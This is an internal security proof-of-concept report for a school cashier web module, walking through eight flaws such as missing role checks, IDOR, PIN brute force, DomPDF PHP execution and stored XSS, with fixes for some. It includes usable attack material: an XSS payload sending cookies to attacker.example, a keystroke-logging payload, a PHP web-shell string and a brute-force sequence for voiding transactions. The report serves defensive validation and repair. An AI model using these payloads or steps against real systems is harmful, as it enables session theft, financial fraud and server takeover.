# CashierV2 Module — Proof of Concept (PoC) Document

**Date:** 2026-05-29  
**Classification:** Internal Security — Engineering/Security Team Only  
**Module:** CashierV2 (`app/Http/Controllers/CashierV2Controller/`)

> **Note:** These PoCs are for internal validation by the security/engineering team only. They require an active authenticated session with a valid school user account (any role). No exploits are pre-built or distributed.

---

## PoC 1 — Any Authenticated User Can Process a Payment Transaction

**Issue Reference:** §2.3 — Zero RBAC  
**Severity:** HIGH  
**Impact:** Unauthorized financial transaction records, false OR issuance

### Preconditions
- Valid session cookie for any non-cashier school account (e.g., a teacher account).
- Knowledge of a student ID (`studid`) and at least one valid `tuitiondetail_id`.

### Steps

1. Log in as a teacher or non-cashier user.
2. Retrieve a student's financial data:
   ```
   GET /students/{studid}/financial-data
   ```
3. Retrieve the next available OR number:
   ```
   GET /next-receipt-number?terminal_no=1
   ```
4. Submit a payment transaction:
   ```http
   POST /process-payment
   Content-Type: application/json

   {
     "student_id": 123,
     "total_amount": 1000,
     "amount_tendered": 1000,
     "transaction_date": "2026-05-29",
     "receipt_type": "official_receipt",
     "payment_details": [
       { "type": 1, "amount": 1000, "reference": null }
     ],
     "selected_items": [
       {
         "label": "Tuition",
         "particulars": "Tuition Fee",
         "amount": 1000,
         "classid": 1,
         "itemid": null,
         "paymentsetupdetail_id": null
       }
     ]
   }
   ```
5. The server returns `{ "success": true, "transaction_id": ... }` and records a new `chrngtrans` row.

### Expected Result (Secure)
HTTP 403 Forbidden — only cashiers with `acadprogutype = 11` should be able to POST to `/process-payment`.

### Actual Result (Vulnerable)
HTTP 200 — transaction is recorded. A new official receipt number is consumed and a `chrngtrans` record is created under the teacher's user ID.

---

## PoC 2 — Unauthorized Receipt Printing via `serverPrint`

**Issue Reference:** §2.1, §2.5 — `serverPrint` + IDOR  
**Severity:** CRITICAL  
**Impact:** Physical printing of any receipt on the server's printer; OR number verification bypass

### Preconditions
- Valid session cookie for any authenticated user.
- Knowledge of any valid `ornum` (OR numbers are sequential, e.g., 001, 002, 003...).
- Knowledge of the corresponding `studid` for that OR (retrievable from the student list endpoint: `GET /students?search=<name>`).

### Steps

1. Log in as any authenticated user (non-cashier).
2. Find a valid `ornum` and `studid` pair:
   ```
   GET /cashier/transactions?search=juan&from=2026-01-01
   ```
   (Returns transaction list including `ornum` and `student_name` — filterable by name.)
3. Call `serverPrint`:
   ```
   GET /cashier/server-print?ornum=00123&studid=456
   ```
4. The server:
   - Runs `shell_exec('wmic printer ...')` to find the default Windows printer.
   - Writes receipt HTML to `storage/app/tmp/receipt_<timestamp>.html`.
   - Launches `mshta.exe` to open the HTA and call `window.print()`.
   - The school's physical printer prints a copy of OR #00123.

### Expected Result (Secure)
HTTP 403 — only the cashier who issued OR #00123 from their terminal should be able to reprint it.

### Actual Result (Vulnerable)
HTTP 200 — physical receipt is printed. The transaction is not flagged as reprinted. No audit log entry is created for the reprint event.

### Additional Risk
The `$templatePath` for the receipt is read from `receipt_template.template_path` in the DB. An attacker with DB admin credentials could set this to an arbitrary Blade template path to achieve server-side template injection.

---

## PoC 3 — Void Any Cashier Transaction Without Owning It (IDOR via Suspended Sale Delete)

**Issue Reference:** §2.6 — Suspended Sale IDOR  
**Severity:** HIGH  
**Impact:** Another cashier's parked (suspended) transaction can be deleted without authorization

### Preconditions
- Valid session cookie for any authenticated user.
- A suspended sale exists (created by any cashier via `POST /cashier/suspended-sales`).

### Steps

1. Log in as any authenticated user.
2. List all suspended sales:
   ```
   GET /cashier/suspended-sales
   ```
   (Returns all suspended sales for all terminals — no scoping to the requesting user.)
3. Delete another cashier's suspended sale:
   ```
   DELETE /cashier/suspended-sales/7
   ```
4. The record is deleted. The original cashier's parked transaction is lost.

### Expected Result (Secure)
HTTP 403 — only the cashier who created the suspended sale (or a supervisor) should be able to delete it.

### Actual Result (Vulnerable)
HTTP 200 — record deleted. No ownership check. No audit trail.

---

## PoC 4 — Void Permission Check Leaks Internal Authorization Structure

**Issue Reference:** §2.3 — Zero RBAC  
**Severity:** MEDIUM (information disclosure)  
**Impact:** Any authenticated user can query the void permission structure for any user

### Steps

1. Log in as any authenticated user.
2. Call the void permission check:
   ```
   GET /cashier/void/check-permission
   ```
3. Response reveals:
   - Whether the current user is a Finance Admin (`authorized: true/false`).
   - The `status_id` field from `chrngpermission` (1 = credentials flow, 2 = PIN flow).
   - The `pin_id` from `chrngpermission` — the ID of the PIN record to use for void authorization.

### Impact
An attacker can determine which void-authorization flow applies to their account, and obtain the `pin_id` needed for the next PIN brute-force step.

---

## PoC 5 — PIN Brute Force (Shared with FinanceV2 Module)

**Issue Reference:** §2.4 — Plaintext PINs  
**Severity:** HIGH  
**Impact:** Void authorization bypass; any transaction can be voided

### Preconditions
- Valid session cookie for any authenticated user.
- `pin_id` obtained from PoC 4 (or by enumerating `chrng_pin` IDs).

### Steps

1. Obtain `pin_id` from `GET /cashier/void/check-permission` (see PoC 4).
2. Submit PIN guesses to:
   ```http
   POST /cashier/void/verify-pin
   Content-Type: application/json

   { "pin": "1234", "pin_id": 3, "chrngtransid": 999 }
   ```
3. There is no rate limiting on this endpoint. An attacker can submit thousands of requests per minute.
4. 4-digit PINs have a maximum of 10,000 combinations. At 1,000 requests/minute: exhausted in ~10 minutes.
5. On success (`ok: true`), the endpoint returns an ephemeral `token` good for 2 minutes.
6. Use the token to void any transaction:
   ```http
   POST /cashier/void
   { "chrngtransid": 999, "auth_token": "<token>", "remarks": "test" }
   ```

### Note on PIN storage
The `chrng_pin.pin_code` column is stored as plaintext. A DB read access leak (backup, SQL injection, insider) immediately reveals all PIN codes without any brute force required.

---

## PoC 6 — DomPDF PHP Execution (Latent — Same as FinanceV2)

**Issue Reference:** §2.2 — `enable_php = true` in 3 PDF methods  
**Severity:** CRITICAL (latent — currently mitigated)  
**Impact:** Remote code execution if `signatoriesHtml` escaping is bypassed

### Current Status
**NOT currently exploitable** — all three PDF-generating methods in `CashierTransactions.php` apply `htmlspecialchars()` to signatory fields before building `$signatoriesHtml`. This prevents `<?php ... ?>` tags from being rendered.

### Latent Exploitation Path

1. A record in `finance_sig_signatories` (the signatories table) is modified to contain a PHP payload in the `name`, `title`, or `designation` field — e.g.:
   ```
   name: <?php file_put_contents('/var/www/html/shell.php', '<?php system($_GET["c"]); ?>'); ?>
   ```
2. Any future code change that removes or bypasses `htmlspecialchars()` would make this executable when the PDF is generated.
3. Since `enable_php = true` allows DomPDF to execute PHP during PDF rendering, the payload would run with the web server's privileges.

### Proof of Configuration
```php
// CashierTransactions.php line 1300 (printVoidHistory)
$pdf->getDomPDF()->set_option('enable_php', true);

// CashierTransactions.php line 1566 (printCashierTransactions)
$pdf->getDomPDF()->set_option('enable_php', true);

// CashierTransactions.php line 1880 (printCollectionReport)
$pdf->getDomPDF()->set_option('enable_php', true);
```

### Fix
```php
$pdf->getDomPDF()->set_option('enable_php', false);
```

---

## PoC 7 — Exception Messages Leak Database Schema

**Issue Reference:** §2.7 — `$e->getMessage()` in 20+ JSON responses  
**Severity:** MEDIUM  
**Impact:** Internal DB schema, table names, and file paths disclosed

### Steps

1. Log in as any authenticated user.
2. Send a malformed request to any endpoint, e.g.:
   ```
   GET /cashier/transactions?from=not-a-date
   ```
   or force a DB error by manipulating filter parameters that are passed to raw SQL.
3. Inspect the HTTP 500 response body:
   ```json
   {
     "error": "Failed to fetch transactions",
     "details": "SQLSTATE[HY093]: COALESCE((SELECT SUM(amount) FROM chrngcashtrans WHERE ...) ... near 'syntax error'"
   }
   ```
4. The response reveals table names (`chrngcashtrans`, `chrngtrans`, `chrngvoidtrans`, etc.), column names, and query structure.

### Impact
This information directly aids a subsequent SQL injection attempt or attack targeted at specific tables.

---

## PoC 8 — Stored XSS via Non-Tuition Item Description

**Issue Reference:** §2.12 — DOM XSS in `displayNonTuitionItems()`  
**Severity:** HIGH  
**Impact:** Session hijacking, PIN keylogging, AES key exfiltration, DOM manipulation in any cashier's browser

### Preconditions
- An account with access to create or edit non-tuition item records (Admin or Finance staff role).
- The cashier module is accessible by at least one cashier (the victim).

### Steps

1. Log in as an admin/finance staff user.
2. Create or edit a non-tuition item and set the `description` field to an XSS payload:
   ```
   <img src=x onerror="fetch('https://attacker.example/steal?s='+document.cookie)">
   ```
   (or for a self-contained keylogger that captures PINs typed into the void authorization flow):
   ```
   <img src=x onerror="document.addEventListener('keydown',function(e){fetch('/log?k='+e.key)})">
   ```
3. Save the item.
4. Wait for any cashier to open the Cashier module and view the non-tuition items panel.
5. The payload executes in the cashier's browser because `home.blade.php` renders `item.description` via:
   ```js
   html += '<strong class="item-name">' + item.description + '</strong>';
   $panelBody.html(html);  // <-- DOM insertion, no escaping
   ```

### Variant: Suspended Sales Customer Name

1. Log in as any cashier.
2. Create a suspended sale for a walk-in customer. Set the customer name to:
   ```
   <img src=x onerror="alert(document.cookie)">
   ```
3. Any cashier who opens the Suspended Sales panel on any terminal will execute the payload.
4. Root cause: `loadSuspendedSales()` renders `sale.customer_name` directly into an HTML template literal with no escaping.

### Expected Result (Secure)
The text `<img src=x ...>` should be displayed as literal characters, not parsed as HTML.

### Actual Result (Vulnerable)
The `<img>` tag is injected into the DOM and the `onerror` handler fires. Any JavaScript in the payload executes with full access to the cashier session, including:
- `document.cookie` (session cookie, XSRF token)
- `document.querySelector('meta[name="fv2-mask-key"]').content` (the AES decryption key)
- The ability to make authenticated AJAX requests as the cashier

### Fix
```js
function escapeHtml(str) {
    return String(str || '')
        .replace(/&/g, '&amp;').replace(/</g, '&lt;')
        .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}
// Apply to every server-derived value before HTML concatenation
html += '<strong>' + escapeHtml(item.description) + '</strong>';
tableHtml += `<td>${escapeHtml(customerName)}</td>`;
```

---

## Summary

| PoC | Issue | Requires Auth | Cashier Role Needed | Severity |
|---|---|---|---|---|
| 1 — Unauthorized payment processing | Zero RBAC | Yes | No | HIGH |
| 2 — Unauthorized receipt printing | serverPrint IDOR | Yes | No | CRITICAL |
| 3 — Delete another cashier's suspended sale | IDOR | Yes | No | HIGH |
| 4 — Leak void permission structure | Info disclosure | Yes | No | MEDIUM |
| 5 — PIN brute force + void bypass | Plaintext PINs | Yes | No | HIGH |
| 6 — DomPDF PHP execution (latent) | enable_php=true | DB access | n/a | CRITICAL (latent) |
| 7 — DB schema leak via error messages | $e->getMessage() | Yes | No | MEDIUM |
| 8 — Stored XSS via non-tuition item / customer name | DOM XSS | Admin (item) or any cashier (customer name) | No | HIGH |

---

*End of CashierV2 PoC Document*
